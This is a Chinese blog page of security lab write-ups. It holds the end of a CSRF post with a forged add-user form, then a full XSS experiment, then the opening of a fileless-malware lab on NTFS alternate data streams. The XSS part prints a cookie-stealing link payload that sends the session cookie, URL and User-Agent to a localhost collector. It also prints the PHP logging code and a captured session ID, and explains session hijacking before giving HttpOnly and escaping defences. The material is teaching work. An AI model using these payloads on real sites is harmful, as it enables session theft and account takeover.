<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost/csrf/do_adduser.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hack123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p><strong>Cookie验证的局限性</strong>：</p>
<ul>
<li>即使启用Cookie验证，浏览器仍会自动附加有效的Cookie，无法完全防止CSRF攻击。</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/" class="post-title-link" itemprop="url">XSS跨站攻击与Cookie验证欺骗实验</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-12-03 08:50:49 / 修改时间：08:51:10" itemprop="dateCreated datePublished" datetime="2024-12-03T08:50:49+08:00">2024-12-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="XSS跨站攻击与Cookie验证欺骗实验"><a href="#XSS跨站攻击与Cookie验证欺骗实验" class="headerlink" title="XSS跨站攻击与Cookie验证欺骗实验"></a>XSS跨站攻击与Cookie验证欺骗实验</h3><h4 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h4><ol>
<li>研究并实践XSS攻击的原理与实现方式。</li>
<li>实现通过XSS攻击获取网页地址、User-Agent及Cookie的方法。</li>
<li>提交实验代码与报告，验证攻击与防护效果。</li>
</ol>
<hr>
<h4 id="二、XSS跨站攻击实现细节"><a href="#二、XSS跨站攻击实现细节" class="headerlink" title="二、XSS跨站攻击实现细节"></a>二、XSS跨站攻击实现细节</h4><h5 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1. 基本原理"></a>1. 基本原理</h5><p>XSS是一种通过注入恶意代码在用户浏览器中执行非授权操作的攻击方式。主要分为：</p>
<ul>
<li><strong>持久型XSS</strong>：恶意代码存储在服务器，能长期触发。</li>
<li><strong>非持久型XSS</strong>：恶意代码不存储，依赖特定URL。</li>
</ul>
<h5 id="2-利用XSS攻击Cookie验证"><a href="#2-利用XSS攻击Cookie验证" class="headerlink" title="2. 利用XSS攻击Cookie验证"></a>2. 利用XSS攻击Cookie验证</h5><p>通过XSS脚本，将目标用户的Cookie发送至攻击者控制的服务器，绕过正常验证实现欺骗。</p>
<p><strong>代码示例：</strong><br>在留言表单中插入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location=&#x27;http://localhost/getsession/savesession.php?cookie=&#x27;+escape(document.cookie);&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>当管理员点击链接时，<code>document.cookie</code>中的SessionID被发送到<code>http://localhost/getsession/savesession.php</code>。</p>
<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129144733663.png" class="" title="image-20241129144733663">
<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129144743544.png" class="" title="image-20241129144743544">
<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129144751976.png" class="" title="image-20241129144751976">
<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129144812283.png" class="" title="image-20241129144812283">
</li>
</ul>
<hr>
<h4 id="三、实现网页地址、User-Agent和Cookie获取"><a href="#三、实现网页地址、User-Agent和Cookie获取" class="headerlink" title="三、实现网页地址、User-Agent和Cookie获取"></a>三、实现网页地址、User-Agent和Cookie获取</h4><h5 id="1-攻击代码"><a href="#1-攻击代码" class="headerlink" title="1. 攻击代码"></a>1. 攻击代码</h5><p>在留言页面注入如下代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;document.location=&#x27;http://localhost/getsession/savelog.php?cookie=&#x27; + encodeURIComponent(document.cookie) + &#x27;&amp;url=&#x27; + encodeURIComponent(document.location.href) + &#x27;&amp;userAgent=&#x27; + encodeURIComponent(navigator.userAgent);&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="2-数据记录服务端代码"><a href="#2-数据记录服务端代码" class="headerlink" title="2. 数据记录服务端代码"></a>2. 数据记录服务端代码</h5><p>创建一个<code>savelog.php</code>文件，记录获取的数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;con_database.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 捕获前端传递的参数</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>] : <span class="string">&quot;No Cookie&quot;</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] : <span class="string">&quot;No URL&quot;</span>;</span><br><span class="line"><span class="variable">$userAgent</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;userAgent&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;userAgent&#x27;</span>] : <span class="string">&quot;No User-Agent&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调试输出到日志文件</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;debug.log&quot;</span>, <span class="string">&quot;Cookie: <span class="subst">$cookie</span>\nURL: <span class="subst">$url</span>\nUser-Agent: <span class="subst">$userAgent</span>\n&quot;</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入到数据库</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cookie</span> &amp;&amp; <span class="variable">$url</span> &amp;&amp; <span class="variable">$userAgent</span>) &#123;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO logs (sessionid, url, userAgent) VALUES (?, ?, ?)&quot;</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>) &#123;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$cookie</span>, <span class="variable">$url</span>, <span class="variable">$userAgent</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Data logged successfully!&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Execution failed: &quot;</span> . <span class="variable">$stmt</span>-&gt;error;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Statement preparation failed: &quot;</span> . <span class="variable">$con</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid data received. Cookie: <span class="subst">$cookie</span>, URL: <span class="subst">$url</span>, User-Agent: <span class="subst">$userAgent</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>showlog.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;con_database.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询日志数据</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;SELECT * FROM logs&#x27;</span>;</span><br><span class="line"><span class="variable">$rs</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查查询结果</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$rs</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Query failed: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Cookie&lt;/th&gt;&lt;th&gt;URL&lt;/th&gt;&lt;th&gt;User-Agent&lt;/th&gt;&lt;/tr&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$rs</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]) . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$row</span>[<span class="string">&#x27;sessionid&#x27;</span>]) . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$row</span>[<span class="string">&#x27;url&#x27;</span>]) . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$row</span>[<span class="string">&#x27;userAgent&#x27;</span>]) . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rs</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">mysqli_free_result</span>(<span class="variable">$rs</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭连接</span></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>数据库</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> lab;</span><br><span class="line"></span><br><span class="line">USE lab;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建存储SessionID和其他信息的表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> logs (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">    sessionid <span class="type">VARCHAR</span>(<span class="number">256</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    url <span class="type">VARCHAR</span>(<span class="number">512</span>),</span><br><span class="line">    userAgent <span class="type">VARCHAR</span>(<span class="number">512</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129152020711.png" class="" title="image-20241129152020711">
<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129212824325.png" class="" title="image-20241129212824325">
<img src="/2024/12/03/XSS%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB%E4%B8%8ECookie%E9%AA%8C%E8%AF%81%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C/image-20241129213527728.png" class="" title="image-20241129213527728">
<hr>
<h4 id="四、实验结果"><a href="#四、实验结果" class="headerlink" title="四、实验结果"></a>四、实验结果</h4><h5 id="1-攻击结果"><a href="#1-攻击结果" class="headerlink" title="1. 攻击结果"></a>1. 攻击结果</h5><ul>
<li>成功窃取网页地址、User-Agent和Cookie，并在服务端<code>showlogs.php</code>中记录：</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Session ID PHPSESSID=<span class="number">6</span>b5m2e67tdi26l28hjjcq093ff</span><br><span class="line">URL http<span class="punctuation">:</span><span class="comment">//localhost/xss/showmessage.php#</span></span><br><span class="line">User-Agent Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv<span class="punctuation">:</span><span class="number">133.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">133.0</span></span><br></pre></td></tr></table></figure>
<h5 id="2-验证Cookie欺骗"><a href="#2-验证Cookie欺骗" class="headerlink" title="2. 验证Cookie欺骗"></a>2. 验证Cookie欺骗</h5><p>将SessionID设置为被窃取的值，访问目标页面，成功伪装为受害者。</p>
<h5 id="3-防护措施"><a href="#3-防护措施" class="headerlink" title="3. 防护措施"></a>3. 防护措施</h5><ul>
<li><p><strong>设置HttpOnly</strong>：禁止通过JavaScript读取Cookie：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;PHPSESSID&#x27;</span>, <span class="title function_ invoke__">session_id</span>(), <span class="number">0</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>HTML转义</strong>：在输出前转义用户输入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$userInput</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><ol>
<li><strong>攻击实现</strong>：<ul>
<li>XSS攻击能够轻松窃取用户信息并实现会话劫持。</li>
<li>利用脚本，获取地址、User-Agent和Cookie等敏感信息。</li>
</ul>
</li>
<li><strong>防护措施</strong>：<ul>
<li>使用HttpOnly属性保护Cookie。</li>
<li>对用户输入进行严格的HTML和JavaScript转义。</li>
</ul>
</li>
<li><strong>建议</strong>：<ul>
<li>定期对网站进行漏洞扫描，防范潜在的XSS攻击。</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/" class="post-title-link" itemprop="url">无文件病毒的定义及实践</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-12-03 08:48:51 / 修改时间：08:49:36" itemprop="dateCreated datePublished" datetime="2024-12-03T08:48:51+08:00">2024-12-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="无文件病毒的定义及实践"><a href="#无文件病毒的定义及实践" class="headerlink" title="无文件病毒的定义及实践"></a>无文件病毒的定义及实践</h3><hr>
<h4 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h4><ol>
<li>理解无文件病毒的定义及其主要类型。</li>
<li>学习并实践利用NTFS数据流文件创建ADS数据流文件。</li>
<li>使用PowerShell实现远程下载与隐匿执行脚本。</li>
</ol>
<hr>
<h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><ul>
<li>操作系统：Windows 10 (支持NTFS文件系统)</li>
<li>工具：<ul>
<li><strong>命令提示符</strong> (cmd)</li>
<li><strong>PowerShell</strong></li>
<li><strong>记事本</strong> (Notepad)</li>
<li><strong>WinHex</strong>（用于查看和删除ADS数据流文件）</li>
<li><strong>网络服务器</strong> (用于托管远程脚本)</li>
</ul>
</li>
</ul>
<hr>
<h4 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h4><h5 id="1-无文件病毒的定义及类型"><a href="#1-无文件病毒的定义及类型" class="headerlink" title="1. 无文件病毒的定义及类型"></a>1. 无文件病毒的定义及类型</h5><p><strong>无文件病毒定义</strong><br>无文件病毒是指不依赖传统文件形式的恶意代码。它利用内存、注册表、合法系统工具（如PowerShell、CMD、NTFS ADS等）执行其功能，从而规避文件扫描型安全软件。</p>
<p><strong>主要类型</strong>：</p>
<ul>
<li><strong>灰色工具型</strong>：使用合法系统工具或组件如PowerShell、注册表、NTFS ADS。</li>
<li><strong>脚本型</strong>：使用脚本语言（如VBScript、JavaScript）进行隐匿攻击。</li>
<li><strong>潜伏型</strong>：将恶意代码隐匿在注册表、WMI或系统库文件中以长期驻留。</li>
<li><strong>内存型</strong>：病毒仅存在于内存中，无磁盘落地，执行后即从内存中移除。</li>
</ul>
<hr>
<h5 id="2-NTFS-ADS数据流文件创建及使用"><a href="#2-NTFS-ADS数据流文件创建及使用" class="headerlink" title="2. NTFS ADS数据流文件创建及使用"></a>2. NTFS ADS数据流文件创建及使用</h5><p><strong>实验步骤</strong>  </p>
<ol>
<li><p><strong>创建附加于宿主文件的ADS数据流文件</strong>：</p>
<ul>
<li><p>使用以下命令创建一个宿主文件：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;Hello World&quot; &gt; primary.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>向宿主文件添加ADS数据流文件：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;ADS Content&quot; &gt; primary.txt:ads.txt</span><br></pre></td></tr></table></figure>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125193817474.png" class="" title="image-20241125193817474">
</li>
<li><p>使用以下命令查看ADS数据流文件：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /r</span><br></pre></td></tr></table></figure>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125193831625.png" class="" title="image-20241125193831625">
</li>
<li><p>打开ADS数据流文件：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad primary.txt:ads.txt</span><br></pre></td></tr></table></figure>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125193906448.png" class="" title="image-20241125193906448">
</li>
</ul>
</li>
<li><p><strong>创建独立的ADS数据流文件</strong>：</p>
<ul>
<li><p>创建一个独立的ADS数据流文件：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> &quot;Independent ADS Content&quot; &gt; :independent.txt</span><br></pre></td></tr></table></figure>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125194002880.png" class="" title="image-20241125194002880">
</li>
<li><p>退至上一级目录，使用 <code>cd ..</code></p>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125194020283.png" class="" title="image-20241125194020283">
</li>
<li><p>查看文件内容：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">notepad test:independent.txt</span><br></pre></td></tr></table></figure>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125195421008.png" class="" title="image-20241125195421008">
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125195437126.png" class="" title="image-20241125195437126">
</li>
<li><p>若无法删除：</p>
<ul>
<li><p>使用WinHex工具定位并删除该ADS数据流文件。(“工具→打开磁盘→选择磁盘”) 没有目录的点（“查看→显示→目录浏览器”）</p>
<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125231915354.png" class="" title="image-20241125231915354">
